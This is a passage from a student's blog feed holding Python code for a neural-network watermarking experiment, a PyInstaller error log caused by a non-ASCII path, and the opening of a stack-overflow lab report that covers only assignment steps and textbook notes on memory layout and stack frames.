class="number">0.05</span></span>):</span><br><span class="line">    prob_sum = <span class="number">0</span></span><br><span class="line">    p_err = <span class="number">1</span> - <span class="number">1.0</span> / C</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Kp):</span><br><span class="line">        cur_prob = comb(Kp, i, exact=<span class="literal">False</span>) * np.power(p_err, i) * np.power(<span class="number">1</span> - p_err, Kp - i)</span><br><span class="line">        prob_sum = prob_sum + cur_prob</span><br><span class="line">        <span class="keyword">if</span> prob_sum &gt; p:</span><br><span class="line">            theta = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> theta</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成水印密钥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_generation</span>(<span class="params">x_train, y_train, marked_model, desired_key_len, num_classes=<span class="number">10</span>, embed_epoch=<span class="number">20</span>, modulation_strength=<span class="number">60000</span></span>):</span><br><span class="line">    key_len = np.dot(<span class="number">40</span>, desired_key_len)</span><br><span class="line">    batch_size = <span class="number">128</span></span><br><span class="line">    num_classes = <span class="number">10</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line">    x_train = x_train.reshape(<span class="number">60000</span>, <span class="number">784</span>)</span><br><span class="line">    x_test = x_test.reshape(<span class="number">10000</span>, <span class="number">784</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    x_train /= <span class="number">255</span></span><br><span class="line">    x_test /= <span class="number">255</span></span><br><span class="line">    y_train = kutils.to_categorical(y_train, num_classes)</span><br><span class="line">    y_test = kutils.to_categorical(y_test, num_classes)</span><br><span class="line">    key_gen_flag = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> key_gen_flag:</span><br><span class="line">        audio_path_V = <span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\20049200530.wav&quot;</span></span><br><span class="line">        mfcc= VP.get_VoicePrint(audio_path_V,key_len)</span><br><span class="line">        mfcc_N = (mfcc-np.<span class="built_in">min</span>(mfcc))/(np.<span class="built_in">max</span>(mfcc)-np.<span class="built_in">min</span>(mfcc))</span><br><span class="line">        x_retrain_VP=np.resize(mfcc_N,(key_len,<span class="number">784</span>))</span><br><span class="line">        <span class="comment"># print(x_retrain_VP.shape)</span></span><br><span class="line">        np.random.seed()</span><br><span class="line">        y_retrain_rand_vec = np.random.randint(<span class="number">10</span>, size=(key_len, <span class="number">1</span>))</span><br><span class="line">        y_retrain_rand = kutils.to_categorical(y_retrain_rand_vec, num_classes)</span><br><span class="line">        x_train_subset = x_train[<span class="number">0</span>:modulation_strength, :]</span><br><span class="line">        y_train_subset = y_train[<span class="number">0</span>:modulation_strength, :]</span><br><span class="line">        x_retrain = np.vstack((x_train_subset, x_retrain_VP))</span><br><span class="line">        y_retrain = np.vstack((y_train_subset, y_retrain_rand))</span><br><span class="line">        unmarked_score = marked_model.evaluate(x_test, y_test, verbose=<span class="number">0</span>)</span><br><span class="line">        prediction_random_key = marked_model.predict(x_retrain_VP, batch_size=batch_size)</span><br><span class="line">        preds = np.argmax(prediction_random_key, axis=<span class="number">1</span>)</span><br><span class="line">        preds = np.reshape(preds, (key_len, <span class="number">1</span>))</span><br><span class="line">        mismatched_result = (preds != y_retrain_rand_vec) * <span class="number">1</span></span><br><span class="line">        random_unmarkMismatched_idx = np.argwhere(mismatched_result)</span><br><span class="line">        random_unmarkMismatched_idx = random_unmarkMismatched_idx[:, <span class="number">0</span>]</span><br><span class="line">        history = marked_model.fit(x_retrain, y_retrain, batch_size=batch_size, epochs=embed_epoch, shuffle=<span class="literal">True</span>, verbose=<span class="number">1</span>, validation_data=(x_test, y_test))</span><br><span class="line">        score = marked_model.evaluate(x_test, y_test, verbose=<span class="number">0</span>)</span><br><span class="line">        score = marked_model.evaluate(x_retrain_VP, y_retrain_rand, verbose=<span class="number">0</span>)</span><br><span class="line">        Perr_marked = <span class="number">1</span> - score[<span class="number">1</span>]</span><br><span class="line">        mark_NN_err = <span class="built_in">int</span>(Perr_marked * key_len)</span><br><span class="line">        prediction_random_key = marked_model.predict(x_retrain_VP, batch_size=batch_size)</span><br><span class="line">        preds = np.argmax(prediction_random_key, axis=<span class="number">1</span>)</span><br><span class="line">        preds = np.reshape(preds, (key_len, <span class="number">1</span>))</span><br><span class="line">        matched_result = (preds == y_retrain_rand_vec) * <span class="number">1</span></span><br><span class="line">        matched_result = np.reshape(matched_result, (matched_result.shape[<span class="number">0</span>], <span class="number">1</span>))</span><br><span class="line">        random_MarkMatched_idx = np.argwhere(matched_result)</span><br><span class="line">        random_MarkMatched_idx = random_MarkMatched_idx[:, <span class="number">0</span>]</span><br><span class="line">        selected_key_idx = np.intersect1d(random_MarkMatched_idx, random_unmarkMismatched_idx)</span><br><span class="line">        selected_keys = x_retrain_VP[np.array(selected_key_idx).astype(<span class="built_in">int</span>), :]</span><br><span class="line">        selected_keys_labels = y_retrain_rand[np.array(selected_key_idx).astype(<span class="built_in">int</span>)]</span><br><span class="line">        usable_key_len = selected_keys.shape[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usable key len is: &#x27;</span>, usable_key_len)</span><br><span class="line">        <span class="keyword">if</span> usable_key_len &lt; desired_key_len:</span><br><span class="line">            key_gen_flag = <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27; Desired key length is &#123;&#125;, Longer key needed, skip this test. &#x27;</span>.<span class="built_in">format</span>(desired_key_len))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key_gen_flag = <span class="number">0</span></span><br><span class="line">            selected_keys = selected_keys[<span class="number">0</span>:desired_key_len, :]</span><br><span class="line">            selected_keys_labels = selected_keys_labels[<span class="number">0</span>:desired_key_len]</span><br><span class="line">            np.save(<span class="string">&#x27;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\keyRandomImage&#x27;</span> + <span class="string">&#x27;_keyLength&#x27;</span> + <span class="built_in">str</span>(desired_key_len) + <span class="string">&#x27;.npy&#x27;</span>, selected_keys)</span><br><span class="line">            np.savetxt(<span class="string">&#x27;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\keyRandomLabel&#x27;</span> + <span class="string">&#x27;_keyLength&#x27;</span> + <span class="built_in">str</span>() + <span class="string">&#x27;.txt&#x27;</span>, selected_keys_labels, fmt=<span class="string">&#x27;%i&#x27;</span>, delimiter=<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            actual_key_len = selected_keys.shape[<span class="number">0</span>]</span><br><span class="line">            marked_model.save_weights(<span class="string">&#x27;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\markedWeights&#x27;</span> + <span class="string">&#x27;.h5&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;WM key generation finished. Save watermarked model. &#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">     selected_keys, selected_keys_labels)</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算不匹配数量</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_response_mismatch</span>(<span class="params">Y_preds, Y_key</span>):</span><br><span class="line">    num_mismatch = np.<span class="built_in">sum</span>((Y_preds == Y_key) * <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> num_mismatch</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>main_blackbox.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># this project combines the ideas behind the watermarking</span></span><br><span class="line"> <span class="comment"># frameworks of Rouhani et al. (2019) and Quan et al. (2020).</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#-------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment"># main program to watermark a DNN and</span></span><br><span class="line"> <span class="comment"># detect original ownership in a black-box setting</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##导入库与模块</span></span><br><span class="line"><span class="keyword">import</span> DeepMarks</span><br><span class="line"><span class="keyword">from</span> DeepMarks <span class="keyword">import</span> key_generation</span><br><span class="line"><span class="keyword">from</span> DeepMarks <span class="keyword">import</span> count_response_mismatch</span><br><span class="line"><span class="keyword">from</span> DeepMarks <span class="keyword">import</span> compute_mismatch_threshold</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> keras.utils.np_utils <span class="keyword">as</span> kutils</span><br><span class="line"><span class="keyword">from</span> topology <span class="keyword">import</span> create_model</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> SGD</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment">## 参数设置</span></span><br><span class="line">    num_classes = <span class="number">10</span></span><br><span class="line">    batch_size = <span class="number">128</span></span><br><span class="line"><span class="comment">## 加载数据集</span></span><br><span class="line">    <span class="comment"># the data, shuffled and split between train and test sets</span></span><br><span class="line">    (x_train, y_train), (x_test, y_test) = mnist.load_data()</span><br><span class="line"><span class="comment">## 数据预处理</span></span><br><span class="line">    x_train = x_train.reshape(<span class="number">60000</span>, <span class="number">784</span>)</span><br><span class="line">    x_test = x_test.reshape(<span class="number">10000</span>, <span class="number">784</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">&#x27;float32&#x27;</span>)</span><br><span class="line">    x_train /= <span class="number">255</span></span><br><span class="line">    x_test /= <span class="number">255</span></span><br><span class="line"><span class="comment">## 类别标签转换</span></span><br><span class="line">    <span class="comment"># convert class vectors to binary class matrices</span></span><br><span class="line">    y_train = kutils.to_categorical(y_train, num_classes)</span><br><span class="line">    y_test = kutils.to_categorical(y_test, num_classes)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 定义水印相关参数</span></span><br><span class="line">    key_len = <span class="number">30</span>             <span class="comment">## desired WM key length</span></span><br><span class="line">    embed_lr = <span class="number">0.0008</span></span><br><span class="line">    p_threshold = <span class="number">0.0001</span></span><br><span class="line">    embed_epoch = <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">    <span class="comment">## ---- Embed WM ------ ##</span></span><br><span class="line"><span class="comment">## 嵌入水印</span></span><br><span class="line">    model = create_model()</span><br><span class="line">    model.load_weights(<span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\unmarked_weights.h5&quot;</span>)</span><br><span class="line">    model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class="line">                optimizer=SGD(learning_rate=embed_lr, momentum=<span class="number">0.9</span>, decay=<span class="number">0.0</span>, nesterov=<span class="literal">True</span>), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">    X_key, Y_key = key_generation(x_train, y_train, model, key_len, num_classes, embed_epoch)</span><br><span class="line">    <span class="comment"># print(len(X_key))</span></span><br><span class="line">    <span class="comment"># print(len(X_key[0]))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">## ----- Detect WM ------ ##</span></span><br><span class="line"><span class="comment">##验证水印</span></span><br><span class="line">    marked_model = create_model()</span><br><span class="line">    marked_model.load_weights(<span class="string">&quot;D:\\大学\\第六学期\\智能终端安全\\DNN-WM\\DNN-Watermarking-main\\result\\markedWeights&quot;</span>+<span class="string">&quot;.h5&quot;</span>)</span><br><span class="line">    marked_model.<span class="built_in">compile</span>(loss=<span class="string">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class="line">                optimizer=SGD(learning_rate=embed_lr, momentum=<span class="number">0.9</span>, decay=<span class="number">0.0</span>, nesterov=<span class="literal">True</span>), metrics=[<span class="string">&#x27;accuracy&#x27;</span>])</span><br><span class="line">    preds_onehot = marked_model.predict(X_key, batch_size = batch_size )</span><br><span class="line"><span class="comment">##计算不匹配数值与阈值</span></span><br><span class="line">    Y_preds = np.reshape(np.argmax(preds_onehot, axis=<span class="number">1</span>), (key_len, <span class="number">1</span>))</span><br><span class="line">    m = count_response_mismatch(Y_preds, Y_key)</span><br><span class="line">    theta = compute_mismatch_threshold(C=num_classes, Kp=key_len, p=p_threshold) <span class="comment"># pk = 1/C, |K|: # trials</span></span><br><span class="line"><span class="comment">##输出最终结果 概率阈值 不匹配阈值 不匹配数量 以及最终结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Probability threshold p is &#x27;</span>, p_threshold)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Mismatch threshold is : &#x27;</span>, theta)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Mismatch count of marked model on WM key set = &#x27;</span>, m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;If the marked model is correctly authenticated by owner: &quot;</span>, m &lt; theta)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>topology.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># this program defines the topology parameters</span></span><br><span class="line"> <span class="comment"># for the main black-box setting</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> keras.utils.np_utils <span class="keyword">as</span> kutils</span><br><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense, Dropout</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> RMSprop, SGD</span><br><span class="line"><span class="keyword">import</span> keras.backend <span class="keyword">as</span> K</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_model</span>(<span class="params">num_classes=<span class="number">10</span></span>):</span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Dense(<span class="number">512</span>, activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=(<span class="number">784</span>,)))</span><br><span class="line">    model.add(Dropout(<span class="number">0.2</span>))</span><br><span class="line">    model.add(Dense(<span class="number">512</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.2</span>))</span><br><span class="line">    model.add(Dense(num_classes, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">    <span class="comment"># model.summary()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DNN-Watermarking-实验报告&quot;&gt;&lt;a href=&quot;#DNN-Watermarking-实验报告&quot; class=&quot;headerlink&quot; title=&quot;DNN Watermarking 实验报告&quot;&gt;&lt;/a&gt;DNN Watermarking 实验报告&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2023/06/01/issue/"/>
    <id>http://example.com/2023/06/01/issue/</id>
    <published>2023-06-01T12:59:55.709Z</published>
    <updated>2023-06-01T13:56:31.887Z</updated>
    
    <content type="html"><![CDATA[<p>对于问题<br>pyinstaller –onefile GUI.py时产生报错</p><p>262 INFO: PyInstaller: 5.11.0<br>264 INFO: Python: 3.9.7<br>296 INFO: Platform: Windows-10-10.0.19045-SP0<br>296 INFO: wrote D:\GUI_ME\GUI.spec<br>305 INFO: UPX is not available.<br>310 INFO: Extending PYTHONPATH with paths<br>[‘D:\GUI_ME’]<br>40 WARNING: qt_material must be imported after PySide or PyQt!<br>1041 INFO: checking Analysis<br>1041 INFO: Building Analysis because Analysis-00.toc is non existent<br>1041 INFO: Initializing module dependency graph…<br>1051 INFO: Caching module graph hooks…<br>1099 INFO: Analyzing base_library.zip …<br>3072 INFO: Loading module hook ‘hook-encodings.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>4520 INFO: Loading module hook ‘hook-pickle.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>5234 INFO: Loading module hook ‘hook-heapq.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>5859 INFO: Caching module dependency graph…<br>6039 INFO: running Analysis Analysis-00.toc<br>6072 INFO: Adding Microsoft.Windows.Common-Controls to dependent assemblies of final executable<br>  required by D:\VS2019\2\Python39_64\python.exe<br>6373 INFO: Analyzing D:\GUI_ME\GUI.py<br>6438 INFO: Loading module hook ‘hook-PyQt5.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>7121 INFO: Processing module hooks…<br>7128 WARNING: Hidden import “sip” not found!<br>7296 INFO: Loading module hook ‘hook-PyQt5.Qt.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>7364 INFO: Loading module hook ‘hook-PyQt5.QtBluetooth.py’ from ‘C:\Users\地瓜<br>干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>7494 WARNING: QtLibraryInfo(PyQt5): could not find translations with base name ‘qtconnectivity’! These translations will not be collected.<br>7494 INFO: Loading module hook ‘hook-PyQt5.QtChart.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>7613 INFO: Loading module hook ‘hook-PyQt5.QtCore.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>7814 WARNING: QtLibraryInfo(PyQt5): could not find translations with base name ‘qtbase’! These translations will not be collected.<br>7814 INFO: Loading module hook ‘hook-PyQt5.QtDBus.py’ from ‘C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>7946 INFO: Loading module hook ‘hook-PyQt5.QtDesigner.py’ from ‘C:\Users\地瓜<br>干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks’…<br>Traceback (most recent call last):<br>  File “D:\VS2019\2\Python39_64\lib\runpy.py”, line 197, in <em>run_module_as_main<br>    return <em>run_code(code, main_globals, None,<br>  File “D:\VS2019\2\Python39_64\lib\runpy.py”, line 87, in <em>run_code<br>    exec(code, run_globals)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\Scripts\pyinstaller.exe_<em>main</em></em>.py”, line 7, in <module><br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller_<em>main</em></em>.py”, line 194, in <em>console_script_run<br>    run()<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller_<em>main</em></em>.py”, line 180, in run<br>    run_build(pyi_config, spec_file, **vars(args))<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller_<em>main</em></em>.py”, line 61, in run_build<br>    PyInstaller.building.build_main.main(pyi_config, spec_file, **kwargs)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\building\build_main.py”, line 1006, in main<br>    build(specfile, distpath, workpath, clean_build)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\building\build_main.py”, line 928, in build<br>    exec(code, spec_namespace)<br>  File “D:\GUI_ME\GUI.spec”, line 7, in <module><br>    a &#x3D; Analysis(<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\building\build_main.py”, line 428, in <strong>init</strong><br>    self.<strong>postinit</strong>()<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\building\datastruct.py”, line 184, in <strong>postinit</strong><br>    self.assemble()<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\building\build_main.py”, line 587, in assemble<br>    self.graph.process_post_graph_hooks(self)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\depend\analysis.py”, line 329, in process_post_graph_hooks<br>    module_hook.post_graph(analysis)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\depend\imphook.py”, line 443, in post_graph<br>    self._load_hook_module(keep_module_ref&#x3D;True)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\depend\imphook.py”, line 383, in _load_hook_module<br>    self._hook_module &#x3D; importlib_load_source(self.hook_module_name, self.hook_filename)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\compat.py”, line 612, in importlib_load_source<br>    return mod_loader.load_module()<br>  File “<frozen importlib._bootstrap_external>“, line 529, in _check_name_wrapper<br>  File “<frozen importlib._bootstrap_external>“, line 1029, in load_module<br>  File “<frozen importlib._bootstrap_external>“, line 854, in load_module<br>  File “<frozen importlib._bootstrap>“, line 274, in _load_module_shim<br>  File “<frozen importlib._bootstrap>“, line 711, in <em>load<br>  File “<frozen importlib._bootstrap>“, line 680, in <em>load_unlocked<br>  File “<frozen importlib._bootstrap_external>“, line 850, in exec_module<br>  File “<frozen importlib._bootstrap>“, line 228, in <em>call_with_frames_removed<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\hooks\hook-PyQt5.QtDesigner.py”, line 14, in <module><br>    hiddenimports, binaries, datas &#x3D; add_qt5_dependencies(<strong>file</strong>)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\utils\hooks\qt_<em>init</em></em>.py”, line 841, in add_qt_dependencies<br>    return qt_info.collect_module(module_name)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\utils\hooks\qt_<em>init</em></em>.py”, line 417, in collect_module<br>    binaries +&#x3D; self.collect_plugins(plugin_type)<br>  File “C:\Users\地瓜干\AppData\Roaming\Python\Python39\site-packages\PyInstaller\utils\hooks\qt_<em>init</em></em>.py”, line 481, in collect_plugins<br>    raise Exception(f”Qt plugin directory ‘{plugin_src_dir}’ does not exist!”)<br>Exception: Qt plugin directory ‘C:&#x2F;Users&#x2F;µØ¹Ï¸É&#x2F;AppData&#x2F;Roaming&#x2F;Python&#x2F;Python39&#x2F;site-packages&#x2F;PyQt5&#x2F;Qt5&#x2F;plugins’ does not exist!</p><p>查询资料<a href="https://github.com/pyinstaller/pyinstaller/issues/7385">Exception: Qt plugin directory ‘*&#x2F;test&#x2F;venv&#x2F;lib&#x2F;site-packages&#x2F;PySide6&#x2F;plugins’ does not exist! · Issue #7385 · pyinstaller&#x2F;pyinstaller (github.com)</a></p><p>由于路径上具有中文，非ASCII编码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;对于问题&lt;br&gt;pyinstaller –onefile GUI.py时产生报错&lt;/p&gt;
&lt;p&gt;262 INFO: PyInstaller: 5.11.0&lt;br&gt;264 INFO: Python: 3.9.7&lt;br&gt;296 INFO: Platform: Windows-1</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>stack_overflow</title>
    <link href="http://example.com/2023/04/24/stack_overflow/"/>
    <id>http://example.com/2023/04/24/stack_overflow/</id>
    <published>2023-04-24T13:29:11.054Z</published>
    <updated>2023-04-24T13:31:08.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="软件与系统安全上机作业1–栈溢出利用的分析报告"><a href="#软件与系统安全上机作业1–栈溢出利用的分析报告" class="headerlink" title="软件与系统安全上机作业1–栈溢出利用的分析报告"></a>软件与系统安全上机作业1–栈溢出利用的分析报告</h2><p>作业内容：进行以下文献阅读、实验操作和代码（指令）分析，撰写分析报告。</p><ol><li><p>阅读 buffer_overflow.pdf 的第 4.1～4.7 节，理解栈溢出攻击的原理。</p></li><li><p>按照 README，运行 exploit 程序，生成 badfile。利用 xxd 分析 badfile，同时分析 exploit.c 源代码，理解并解释为什么程序能够生成 badfile 的内容。</p></li><li><p>按照 README 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果。</p></li><li><p>详细分析 stack.asm 中的 main 函数及 bof 函数对应的汇编指令序列，画出从 main 起始到调用 bof 函数执行、再到返回 main 的过程中关键的栈状态。解释这些关键的栈状态，说明栈溢出攻击是如何实现的。（需要画出并解释的栈状态包括但不限于：call fread 后，call bof 前，bof 内 call strcpy 前，bof 内 call strcpy后，bof 内 ret 前，从 bof 返回 main 后）。</p><p>注：要求自己画栈状态，禁止从阅读材料中复制。</p></li></ol><h4 id="1-阅读-buffer-overflow-pdf-的第-4-1～4-7-节，理解栈溢出攻击的原理"><a href="#1-阅读-buffer-overflow-pdf-的第-4-1～4-7-节，理解栈溢出攻击的原理" class="headerlink" title="1.阅读 buffer_overflow.pdf 的第 4.1～4.7 节，理解栈溢出攻击的原理"></a>1.阅读 buffer_overflow.pdf 的第 4.1～4.7 节，理解栈溢出攻击的原理</h4><p>在这里大概记录了在文献阅读中一些关于大概框架和内容，学习到的知识和一些自己的思考，作为阅读文献的笔记</p><h5 id="4-1-程序内存布局"><a href="#4-1-程序内存布局" class="headerlink" title="4.1 程序内存布局"></a>4.1 程序内存布局</h5><p>对于典型C程序，内存被分为五段</p><p>代码段：存储程序可执行代码，通常是只读的</p><p>数据段：存储初始化的静态变量全局变量</p><p>BSS段：存储未初始化的静态变量全局变量</p><p>堆：为动态内存分配提供空间</p><p>栈：存储函数内部定义的局部变量以及函数调用的相关数据</p><h5 id="4-2-栈与函数调用"><a href="#4-2-栈与函数调用" class="headerlink" title="4.2 栈与函数调用"></a>4.2 栈与函数调用</h5><h6 id="栈帧-四个重要区域"><a href="#栈帧-四个重要区域" class="headerlink" title="栈帧 四个重要区域"></a>栈帧 四个重要区域</h6><p>Arguments Return Address Previous Frame Pointer Local Variables</p><h6 id="帧指针"><a href="#帧指针" class="headerlink" title="帧指针"></a>帧指针</h6><p>在函数中，需要访问参数和局部变量，需要知道他们的内存地址，引入帧指针，指向栈帧中固定位置，偏移量在编译时确定，帧指针的值在运行时更改</p><p>使用运行时确定的帧指针和编译时确定的偏移量，我们可以找到所有变量的地址</p><h6 id="Previous-frame-pointer（前帧指针？）与函数调用链"><a href="#Previous-frame-pointer（前帧指针？）与函数调用链" class="headerlink" title="Previous frame pointer（前帧指针？）与函数调用链"></a>Previous frame pointer（前帧指针？）与函数调用链</h6><p>帧指针指向当前函数栈帧，如果调用函数返回之后无法了解返回后的栈帧在哪，为解决这个问题，引入前帧指针，返回函数后用此值设置帧指针寄存器，指向之前的栈帧。</p><h5 id="4-3-栈溢出攻击"><a href="#4-3-栈溢出攻击" class="headerlink" title="4.3 栈溢出攻击"></a>4.3 